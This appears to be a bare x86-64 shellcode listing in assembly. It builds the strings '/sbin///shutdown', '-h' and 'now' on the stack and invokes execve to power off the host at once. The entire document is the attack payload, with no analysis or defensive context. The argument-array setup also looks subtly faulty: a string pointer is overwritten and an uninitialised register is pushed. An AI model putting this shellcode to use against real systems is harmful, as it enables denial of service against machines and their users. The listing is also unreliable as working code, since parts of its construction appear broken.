section .text

global _start

_start:

mov rax,0
push 0
pop rdx

push rax
push byte 0x77
push word 0x6f6e
push rsp
pop rbx

push rax
push word 0x682d
push rsp
pop rbx

push rax
mov r8 , 0x2f2f2f6e6962732f
mov r10 , 0x6e776f6474756873
push r10
push r8
xor rdi, rdi
add rdi, rsp

push rdx
push rbx
push rcx
push rdi
xchg rsi, rsp
push rsi
pop rsp

add rax , 59
syscall
